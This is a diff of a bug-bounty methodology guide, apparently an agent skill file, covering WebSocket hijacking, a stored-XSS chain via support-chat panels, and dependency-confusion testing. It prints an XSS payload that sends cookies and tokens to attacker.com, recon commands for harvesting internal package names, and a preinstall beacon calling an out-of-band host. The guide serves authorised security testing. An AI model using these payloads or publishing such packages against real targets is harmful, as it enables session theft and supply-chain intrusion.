+carries cookies automatically like any other request, but the `Origin`
+header on that handshake is the *only* same-origin protection unless the
+app checks it explicitly.
+
+```
+1. Open the target's WebSocket-using page while authenticated, capture the
+   handshake request (`GET /ws HTTP/1.1`, `Upgrade: websocket`, cookies attached).
+2. Host a page on an attacker-controlled origin that opens the same
+   WebSocket URL from the victim's browser: `new WebSocket("wss://target.com/ws")`.
+3. If the connection completes and the attacker's page can read messages
+   the server sends back (account data, chat history, tokens) → the
+   handshake has no Origin check → CSWSH, no CSRF token protects it because
+   there's no separate token mechanism for the WS upgrade.
+```
+
+### Auth-Once, Trust-Forever Message Handling
+Many implementations validate auth **only at the handshake** (via a cookie
+or an initial `{"type":"auth","token":"..."}` message) and then trust every
+subsequent message on that connection with no further authorization check
+per message. This means:
+- A message that changes the acting user/target ID mid-session (e.g.
+  `{"action":"switch_context","userId":"other"}`) may not re-validate
+  ownership — same root cause as IDOR, but worth checking explicitly since
+  the connection-level auth check can mask it during casual testing.
+- A connection kept open past a server-side session/token expiry may keep
+  working — test whether revoking the underlying session (logout, token
+  invalidation) actually closes or restricts the open WebSocket, not just
+  blocks new connections.
+
+### Testing Checklist
+```
+[ ] Capture the WS handshake — is Origin checked server-side, or just logged?
+[ ] Host a cross-origin PoC page, attempt the handshake from the victim's browser
+[ ] Send a message that changes user/resource context mid-connection — does
+    the server re-check ownership, or just route it?
+[ ] Invalidate the session/token the connection authenticated with — does
+    the open socket keep working?
+[ ] Fuzz message `type`/`action` fields the same way you'd fuzz REST
+    endpoints — undocumented message types often skip validation present
+    on the documented ones
+```
+
+### Real Chain: Stored XSS via Chat Widget Into an Unrestricted Agent Browser
+
+A concrete, non-obvious pattern on any product with a live customer-support
+chat widget (in-house or off-the-shelf, often riding STOMP-over-WebSocket):
+the **agent-side panel** frequently renders visitor messages with
+`innerHTML`/Vue `v-html` instead of a text-only binding, on the theory that
+visitor input is "just chat text." It isn't sanitized the way the
+public-facing widget's own display might be.
+
+```
+1. Connect to the chat widget as an anonymous visitor (no auth needed —
+   that's the normal, intended use of the widget).
+2. Send a message containing a payload that doesn't need <script> to fire,
+   e.g. an image-type message whose URL/src field is rendered unescaped:
+   <img src=x onerror="fetch('https://attacker.com/c?d='+document.cookie+localStorage.getItem('token'))">
+3. Wait for a support agent to open the conversation in their internal panel.
+4. If the panel renders the message body unescaped, the payload executes
+   in the AGENT's browser — not the visitor's.
+```
+
+**Why this is higher-impact than it looks:** the agent's browser is
+frequently on a workstation with normal internet egress — it is often *not*
+behind the same network segmentation that protects the backend the chat
+widget talks to. A payload that can't reach anything interesting from the
+visitor's side (sandboxed, no internal network access) can freely exfiltrate
+the agent's cookies/localStorage/tokens and pivot to whatever internal admin
+APIs the agent's session has access to. Check specifically whether the
+message-type field the widget uses for image/media messages skips the same
+sanitization path that plain-text messages go through — a filter written to
+catch `<script>` in a text field is frequently never applied to a `src`/`url`
+field on a different message type.
+
+**Chain:** anonymous chat message → stored XSS fires in agent's unrestricted
+browser → agent session token/cookie exfiltrated → pivot to admin API using
+the agent's live session = Critical (cross-privilege ATO, no auth required
+to plant the payload).
+
+### Impact Chain
+```
+CSWSH + connection exposes sensitive data on connect          High (cross-account data read)
+CSWSH + connection accepts state-changing messages            Critical (cross-account actions, no CSRF token needed)
+Mid-connection context switch skips ownership check            High (same as IDOR — report as IDOR, not as a new class)
+Origin correctly validated + auth re-checked per message        N/A
+```
+
+---
+
+## 31. DEPENDENCY CONFUSION / SUPPLY CHAIN  📦
 
 > When an org's build pulls from **both** a private registry and the public one, an attacker who publishes a public package with the **same name + a higher version** can get their code executed inside the org's CI/dev machines. Alex Birsan's 2021 research made **$130k+ across 35 companies** (Apple, Microsoft, PayPal, Netflix, Uber, Tesla) this way — and it is still live: Microsoft Security documented 33 malicious npm packages abusing it in May 2026.
 >
-> **The entire bug is "can your code RIGHT NOW execute on their infra?"** — a DNS/HTTP callback from their network is the proof. No callback = no bug. This class has the hardest ethical line in the skill: **PoC fires a callback ONLY, never a real payload.**
+> **The entire bug is "can your code RIGHT NOW execute on their infra?"** — a DNS/HTTP callback from their network is the proof. No callback = no bug. This class has the hardest ethical line in this skill: **PoC fires a callback ONLY, never a real payload.**
 
 ### Root Cause
 The package-manager resolver prefers **highest version across all configured registries** instead of pinning name→registry origin.
 
 ```bash
+# VULNERABLE — internal pkg "acme-auth-utils" lives only on the private registry,
+# but the resolver also checks public npm. Attacker publishes acme-auth-utils@99.0.0
+# to public npm → resolver sees 99.0.0 > internal 1.4.2 → installs the attacker's.
+npm install            # no scope, no lockfile pin, registry fallback enabled
 
-## 26. PADDING ORACLE & CRYPTO MISUSE
+# SECURE — scoped name bound to a registry; attacker can't publish under the scope
+# @acme/auth-utils  +  .npmrc: @acme:registry=https://npm.internal.acme.com
+# pip: --require-hashes   Maven: <checksumPolicy>fail</checksumPolicy>   Go: committed go.sum + -mod=readonly
+```
+
+### Detection — Step 1: Harvest Internal Package Names
+The whole attack starts with a name the org uses internally but hasn't reserved publicly. Where they leak:
+
+```bash
+# (1) Leaked package.json / lockfiles in public GitHub repos & gists
+# GitHub code search (web or gh): find dependency blocks referencing the org
+#   "dependencies" "acme-" filename:package.json
+#   filename:package-lock.json acme       filename:yarn.lock @acme
+#   filename:requirements.txt acme        filename:Gemfile acme   filename:pom.xml acme
+
+# (2) JS bundles on the org's own sites — the most reliable source (recon already has these)
+#     require('internal-pkg') / import survives bundling; webpack chunk comments leak names
+grep -rhoE "require\(['\"][@a-z0-9._/-]+['\"]\)" recon/$TARGET/js/ | sort -u
+grep -rhoE "from ['\"]@[a-z0-9-]+/[a-z0-9._-]+['\"]" recon/$TARGET/js/ | sort -u   # scoped imports
+# Webpack/Vite source maps map minified back to original module paths:
+grep -rhoE '"[@a-z0-9._/-]+"' recon/$TARGET/js/*.map 2>/dev/null | grep -iE "$ORGKEYWORD" | sort -u
+
+# (3) .npmrc / .pip.conf / .gemrc / settings.xml referencing an internal registry host
+#     (these confirm a private registry EXISTS — i.e. the fallback condition is plausible)
+grep -rniE "registry=|index-url|@[a-z]+:registry|nexus|artifactory|verdaccio|packagecloud" recon/$TARGET/
+
+# (4) Error messages / 404s — an internal registry 404 or a stack trace naming a module
+#     "Cannot find module 'acme-internal-sdk'"  /  "No matching distribution found for acme-..."
+```
+
+```
+Other leak spots worth a look:
+  Dockerfile / docker-compose       COPY .npmrc, RUN npm i acme-internal
+  CI configs                        .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile (npm/pip install lines)
+  Public Postman/Swagger/SDK docs   sample "npm install @acme/..." snippets
+  source-map module paths           webpack:///./node_modules/acme-... in *.js.map
+```
+
+### Detection — Step 2: Confirm the Name Is Unclaimed on the Public Registry
+This is the **kill switch**. If the public registry already serves that name, it's N/A — either the org owns it (safe) or someone else does (out of your hands).
+
+```bash
+# npm  — 404 / "is not in this registry" = claimable; any result = STOP, already taken
+npm view acme-auth-utils            # E404 → unclaimed
+# pip  — no matching distribution = claimable
+pip index versions acme-internal-sdk 2>&1 | grep -i "no matching\|not found"
+# RubyGems
+gem list -r acme_internal           # empty = claimable
+# Maven Central — check the groupId/artifactId path resolves
+curl -s -o /dev/null -w "%{http_code}\n" \
+  "https://repo1.maven.org/maven2/com/acme/internal-lib/"   # 404 = not on Central
+```
+
+> **Only proceed if BOTH are true: (a) name is used internally, (b) name is unclaimed on the public registry the org's build can reach.** Speculative "they might pull from public" with no evidence the build does so is N/A on most programs.
+
+### The Responsible-Disclosure PoC — Callback Only, Never a Payload
+Publish a **benign placeholder** whose only job is to fire a DNS/HTTP beacon proving execution on the org's infra. This is the single most important boundary in this class.
+
+```json
+// package.json — npm. The scripts hook runs on `npm install`.
+{
+  "name": "acme-auth-utils",
+  "version": "99.0.0",                 // higher than internal so the resolver prefers it
+  "description": "bug bounty PoC placeholder — contact security@yourhandle, see README",
+  "scripts": {
+    "preinstall": "node beacon.js"     // preinstall fires even if install later aborts
+  }
+}
+```
+
+```js
+// beacon.js — the ONLY thing it does: one DNS/HTTP callback proving "code ran here".
+// PERMITTED: hostname + whoami + cwd, ONLY to prove a real corporate host (not a registry
+// scanner) ran it, and ONLY if the program's policy doesn't forbid host metadata.
+// FORBIDDEN: reverse shell, reading files, dumping env/secrets, persistence, lateral movement,
+//            anything beyond proving execution. A real payload turns a bounty into a CFAA problem.
+const os = require('os');
+const id = `${os.hostname()}.${require('os').userInfo().username}`.replace(/[^a-z0-9.-]/gi,'-');
+// DNS callback — survives egress-filtered corp networks (Birsan's choice). Use a logging DNS host:
+require('dns').lookup(`${id}.YOURID.oast.fun`, () => {});      // interactsh / Burp Collaborator / dnsbin
+// Optional HTTP callback as a second signal (only if egress allows):
+try { require('https').get(`https://YOURID.oast.fun/?h=${id}`, () => {}); } catch (e) {}
+```
+
+```bash
+# Publish, then WAIT for a callback from THEIR network. Do not report before it fires.
+npm publish                          # PyPI: python -m build && twine upload ; gem build && gem push
+# When a hit lands, confirm it's the TARGET, not an automated registry scanner:
+#   - ARIN/whois the source IP → does it belong to the org / their cloud account?
+#   - hostname pattern matches their naming? cwd looks like a CI runner / dev box?
+# Then UNPUBLISH / deprecate immediately and report. Leaving a higher version live is a DoS.
+npm unpublish acme-auth-utils@99.0.0
+```
+
+> **Submission rule:** a confirmed callback **from the target's infrastructure** = real RCE-class impact, payable. A callback only from npm's/PyPI's own crawler infra = N/A false positive. No callback at all = N/A. Many hunters report prematurely and get closed Informative; wait for the genuine hit.
+
+### Variants by Ecosystem
+
+| Ecosystem | Execution hook | Where names leak | Confirm unclaimed |
+|---|---|---|---|
+| **npm / yarn / pnpm** | `preinstall`/`postinstall` script | `package.json`, lockfiles, JS bundle `require()`, `.npmrc` | `npm view <name>` → E404 |
+| **pip / PyPI** | `setup.py` runs on install (`cmdclass`/`install`) | `requirements.txt`, `setup.py`, `pyproject.toml`, `.pip/pip.conf` `index-url` | `pip index versions <name>` |
+| **Maven / Gradle** | no install hook — confusion = build pulls poisoned artifact | `pom.xml` groupId/artifactId, `settings.xml` (Nexus/Artifactory repo) | Maven Central path 404 |
+| **RubyGems** | `extconf.rb` / gemspec native-ext build step | `Gemfile`, `*.gemspec`, `.gemrc` source list | `gem list -r <name>` empty |
+| **NuGet / Go** | NuGet: install scripts; Go: build-time only | `*.csproj`, `nuget.config`; `go.mod` (less exploitable — proxy + go.sum) | registry lookup 404 |
+
+> **Scoped-name nuance (npm):** `@acme/auth-utils` is NOT confusable unless the scope `@acme` is **unregistered** on public npm — then an attacker can register the scope and publish under it. Unscoped names (`acme-auth-utils`) are the classic, easier case. Check whether the scope itself is claimable.
+
+### Scope Caveats — What's Submittable vs N/A
+```
+Confirmed callback FROM target infra (ARIN-verified)          = High/Critical (RCE-class) — submit
+Internal name unclaimed + private registry confirmed,         = Low/Info, often N/A — "speculative, no
+  but NO callback / can't prove their build pulls public         proof of execution" closes it
+Internal name already on public npm/PyPI (org or 3rd-party)   = N/A (not exploitable by you)
+Org pins all deps to scope/lockfile-with-integrity/hashes     = N/A (resolver can't be confused)
+Internal package NEVER published publicly + program says      = N/A (not in scope, per program policy)
+  that's required
+Typosquat (similar name, not exact internal name)             = usually N/A on BBPs — low signal, treat as separate
+```
+
+> **Per-program reality:** Netflix marks shared-root-cause dep-confusion reports as Duplicate but accepts clear evidence of execution from infra. Facebook rejected a report where the internal package was never on npmjs.com. Always read the program's supply-chain policy before publishing anything — and never publish a package the program hasn't put package registries in scope for.
+
+### Real Paid Examples
+- **$130,000+** — Alex Birsan's 2021 research across 35 companies (Apple, Microsoft, PayPal, Netflix, Uber, Tesla, Yelp, Shopify); DNS-callback PoCs only, 200+ benign packages on npm/PyPI/RubyGems
+- **$5,000** — RCE via dependency confusion, callback proving execution (username/hostname/cwd), HackerOne writeup
+- **$2,500** — RCE via an unclaimed Node package pulled into a target's build (HackerOne writeup)
+- pattern seen on HackerOne — Sifchain disclosed dependency-confusion report (public disclosure #1187816)
+- Still active in 2026: Microsoft Security documented 33 malicious npm packages abusing dependency confusion to profile developer environments (May 2026) — proves the resolver flaw persists at scale
+
+### Chains That Pay
+```
+Leaked package.json on GitHub -> unclaimed name -> callback PoC fires from CI       Critical (RCE on build infra)
+JS bundle require('internal') -> unclaimed -> callback from dev laptop              High/Critical
+.npmrc internal-registry ref -> confirms fallback config -> confusion confirmed     supports the chain
+Callback proves exec -> (DO NOT escalate to real RCE) -> report exec proof only     Critical, stays ethical
+Internal name found but already public / fully pinned                               N/A — kill it, move on
+```
+
+### Triage
+```
+Callback fired from target-owned IP (ARIN-verified) + name was unclaimed   = Critical/High — RCE-class, submit
+Callback fired but only from registry-scanner IP                           = N/A (false positive)
+Name unclaimed + private registry config proven, no callback yet           = wait; premature report = Informative
+Name already claimed on public registry                                    = N/A (not exploitable)
+Deps fully scoped + lockfile integrity + hash-pinned                       = N/A (not confusable)
+Real payload used instead of a benign callback                             = STOP — do not submit, legal/ethical breach
+```
+
+---
+
+## 32. PADDING ORACLE & CRYPTO MISUSE
 > Apps encrypt session data, settings, or state into cookies / hidden fields / URL params to make them tamper-proof. When the **decryption** path leaks whether padding is valid (via differential responses), an attacker without the key can decrypt **and forge** arbitrary plaintexts. ASP.NET ViewState, Rails session cookies, and home-grown CBC-encrypted cookies remain common targets. Also covers ECB block-repetition and weak-hash quick-wins.
+
+Cheaper variant when machineKey is leaked elsewhere (web.config exposure via path traversal, `/elmah.axd`, `/trace.axd`, `.git/` exposure): skip PadBuster, jump straight to ysoserial.net. `web2-recon`'s Source Disclosure & Extraction section covers finding a leaked `web.config`/machineKey directly.
 
 ### Identifying Padding Oracle Candidates
 | Signal | What it means |
